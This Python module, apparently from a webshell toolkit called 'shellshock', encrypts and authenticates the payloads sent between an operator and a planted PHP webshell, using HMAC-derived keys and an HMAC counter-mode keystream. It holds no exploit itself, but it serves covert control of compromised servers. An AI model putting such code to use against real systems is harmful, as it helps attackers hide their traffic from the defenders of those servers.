"""Symmetric payload encryption for encrypted-mode webshells.

It's PHP counterpart is implemented in shellshock/creator/crypto.py; both sides
take prefix, nonce length and scheme from the contract.

Only the payloads exchanged with a shell are encrypted; the shell source itself
is not. The password is provided at runtime and never stored.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import os

from .protocol import contract

def _keys(password: str) -> tuple[bytes, bytes]:
    """Derive two keys from one password. One used as encryption key (pos 0) and the other as mac (pos 1)"""
    rawPass = password.encode("utf-8")

    encKey = hmac.new(rawPass, contract.ENC_LABEL, hashlib.sha256).digest()
    macKey = hmac.new(rawPass, contract.MAC_LABEL, hashlib.sha256).digest()

    return encKey, macKey

def _keystream(password: bytes, nonce: bytes, length: int) -> bytes:
    """HMAC-SHA256 counter-mode keystream, ``length`` bytes long."""
    stream = bytearray()
    counter = 0
    while len(stream) < length:
        stream += hmac.new(
            password, nonce + str(counter).encode("ascii"), hashlib.sha256
        ).digest()
        counter += 1
    return bytes(stream[:length])


def _xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def encrypt(text: str, password: str, nonce: bytes | None = None) -> str:
    """Encrypt ``text`` into the contract envelope."""
    data = text.encode("utf-8")
    if nonce is None:
        nonce = os.urandom(contract.NONCE_BYTES)

    if len(nonce) != contract.NONCE_BYTES:
        raise ValueError("nonce length isn't contract length")
    
    encKey, macKey = _keys(password)
    ciphertext = _xor(data, _keystream(encKey, nonce, len(data)))
    blob = nonce + ciphertext
    tag = hmac.new(macKey, blob, hashlib.sha256).digest()
    encoded = base64.urlsafe_b64encode(blob + tag).decode("ascii").rstrip("=")

    return contract.ENCRYPTED_PREFIX + encoded

def decrypt(payload: str, password: str) -> str:
    """Decrypt an envelope produced by this module or by the PHP shell."""
    if not payload.startswith(contract.ENCRYPTED_PREFIX):
        raise ValueError("not an encrypted payload")
    body = payload[len(contract.ENCRYPTED_PREFIX):]
    raw = base64.urlsafe_b64decode(body + "=" * (-len(body) % 4))

    if len(raw) < (contract.NONCE_BYTES + contract.MAC_BYTES):
        raise ValueError("encrypted payload too short")

    encKey, macKey = _keys(password)
    
    nonce = raw[:contract.NONCE_BYTES]
    tag = raw[-contract.MAC_BYTES:]
    ciphertext = raw[contract.NONCE_BYTES:-contract.MAC_BYTES]
    expected = hmac.new(macKey, nonce + ciphertext, hashlib.sha256).digest()
    
    if not hmac.compare_digest(tag, expected):
        raise ValueError("wrong password or corrupt payload")

    return _xor(ciphertext, _keystream(encKey, nonce, len(ciphertext))).decode("utf-8", "replace")